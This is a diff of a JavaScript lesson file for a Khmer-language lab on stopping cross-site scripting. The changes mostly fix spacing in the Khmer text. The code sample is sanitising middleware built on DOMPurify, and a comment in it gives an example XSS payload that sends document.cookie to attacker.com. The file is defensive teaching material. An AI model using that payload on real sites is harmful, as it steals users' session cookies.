@@ -5,10 +5,10 @@ export const meta = {
   khmerTitle: "ការទប់ស្កាត់ការវាយប្រហារ Cross-Site Scripting (XSS)",
   type: "lab",
   codeLanguage: "javascript",
-  summary: `Cross-Site Scripting (XSS) កើតឡើងនៅពេលដែលការបញ្ចូល HTML ឬ JavaScript របស់អ្នកប្រើដែលមិនគួរឱ្យទុកចិត្តត្រូវបានឆ្លុះបញ្ចាំងទៅក្នុងគេហទំព័រដោយគ្មានការបំប្លែងកូដ ឬSanitizationត្រឹមត្រូវ។ ខណៈពេលដែលស៊ុមខាងមុខទំនើបដូចជា React គេចចេញពីកន្សោម JSX ដោយស្វ័យប្រវត្តិនោះ APIs ខាងក្រោយគួរតែសម្អាតវាលអត្ថបទដោយប្រើឧបករណ៍ដូចជា \`xss-clean\` ឬ \`isomorphic-dompurify\` ដើម្បីការពារស្គ្រីបព្យាបាទដែលបានរក្សាទុក។`,
-  tip: "សម្អាតវាលអត្ថបទសម្បូរបែបដែលបង្កើតដោយអ្នកប្រើប្រាស់ (ដូចជាមាតិកាប្លុក ឬមតិយោបល់) នៅលើServer មុនពេលរក្សាទុកទៅ MongoDB ដោយប្រើ DOMPurify ។",
-  objective: "ស្វែងយល់អំពីមេកានិច XSS និងអនុវត្តSanitizationអង្គភាព HTML ខាងServer។",
-  expectedOutcome: "សម្អាតកំណត់ត្រាDatabaseដោយឥតគិតថ្លៃពីការបញ្ចូលស្គ្រីបដែលអាចប្រតិបត្តិបាន។",
+  summary: `Cross-Site Scripting (XSS) កើតឡើងនៅពេលដែលការបញ្ចូល HTML ឬ JavaScript របស់អ្នកប្រើដែលមិនគួរឱ្យទុកចិត្តត្រូវបានឆ្លុះបញ្ចាំងទៅក្នុងគេហទំព័រដោយគ្មានការបំប្លែងកូដ ឬ Sanitization ត្រឹមត្រូវ។ ខណៈពេលដែលស៊ុមខាងមុខទំនើបដូចជា React គេចចេញពីកន្សោម JSX ដោយស្វ័យប្រវត្តិនោះ APIs ខាងក្រោយគួរតែសម្អាតវាលអត្ថបទដោយប្រើឧបករណ៍ដូចជា \`xss-clean\` ឬ \`isomorphic-dompurify\` ដើម្បីការពារស្គ្រីបព្យាបាទដែលបានរក្សាទុក។`,
+  tip: "សម្អាតវាលអត្ថបទសម្បូរបែបដែលបង្កើតដោយអ្នកប្រើប្រាស់ (ដូចជាមាតិកាប្លុក ឬមតិយោបល់) នៅលើ Server មុនពេលរក្សាទុកទៅ MongoDB ដោយប្រើ DOMPurify ។",
+  objective: "ស្វែងយល់អំពីមេកានិច XSS និងអនុវត្ត SanitizationEntity HTML ខាង Server ។",
+  expectedOutcome: "សម្អាតកំណត់ត្រា Database ដោយឥតគិតថ្លៃពីការបញ្ចូលស្គ្រីបដែលអាចប្រតិបត្តិបាន។",
   codeSnippet: "import DOMPurify from \"isomorphic-dompurify\";\n\nexport const sanitizeContent = (req, res, next) => {\n  if (req.body.content) {\n    // Strips <script>, javascript: links, and malicious attributes like onerror=...\n    req.body.content = DOMPurify.sanitize(req.body.content);\n  }\n  if (req.body.bio) {\n    req.body.bio = DOMPurify.sanitize(req.body.bio);\n  }\n  next();\n};\n\n// Attack: \"<script>fetch('http://attacker.com?c='+document.cookie)</script>Hello\"\n// Output: \"Hello\"",
 };
 
